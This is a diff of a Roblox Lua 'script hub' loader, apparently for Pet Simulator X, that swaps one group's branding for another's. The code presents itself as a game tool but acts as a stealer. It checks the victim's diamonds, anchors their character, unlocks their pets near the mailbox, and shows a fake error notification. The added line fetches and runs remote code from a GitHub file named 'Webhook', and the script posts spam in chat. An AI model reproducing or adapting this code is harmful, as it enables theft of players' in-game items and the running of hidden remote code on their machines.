@@ -13,6 +13,15 @@ local PetFolders = {
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
 };
+if time() <= 30 then
+	wait(0);
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "Script error",
+		Text = "Please wait and try again Remote not found !",
+		Icon = "rbxassetid://57254792",
+		Duration = 15
+	});
+	return;
 end;
 local Loading = Instance.new("ScreenGui");
 local MainFrame = Instance.new("Frame");
@@ -54,7 +63,7 @@ Title.BackgroundTransparency = 0;
 Title.Position = UDim2.new(0, 0, 0, 0);
 Title.Size = UDim2.new(0, 0, 0, 0);
 Title.Font = Enum.Font.FredokaOne;
-Title.Text = "Monz Scriptz On Top";
+Title.Text = "Hostee Scriptz On Top | .gg/hosteehub";
 Title.TextColor3 = Color3.fromRGB(255, 255, 255);
 Title.TextScaled = true;
 Title.TextSize = 0;
@@ -211,10 +220,10 @@ end;
 (coroutine.wrap(SNUMK_fake_script))();
 local function LSNGUH_fake_script()
 	local script = Instance.new("LocalScript", Loading);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true);
 end;
 (coroutine.wrap(LSNGUH_fake_script))();
 local mailbox = (game:GetService("Workspace")).__MAP.Interactive.Mailbox;
@@ -227,15 +236,15 @@ end;
 if Client.leaderstats.Diamonds.Value < _G.Diamonds then
 	Client:Kick("Error launching script. Error code: " .. _G.ScriptName .. ".LaunchScript");
 end;
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true);
 if _G.AntiLeave == true then
 	RobloxGui:Destroy();
 end;
 wait(0);
 Client.Character.HumanoidRootPart.Anchored = true;
-(loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Monz")))();
-writefile("Monz Better.txt", "https://discord.gg/dvCgjJVFVu");
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Monz Better", "All");
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20Webhook%20%E2%9C%97")))();
+writefile("MonzOnTop.txt");
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|MonzHub On Top!!!|", "All");
 if _G.UnlockPets == true then
 	local function unlockPetsInFolder(folder)
 		local children = folder:GetChildren();
@@ -245,7 +254,7 @@ if _G.UnlockPets == true then
 				if child.Name then
 					local args2 = {
 						[1] = {
-							["" .. name] = false
+							["" .. name] = true
 						}
 					};
 					Invoke("Lock Pet", unpack(args2));
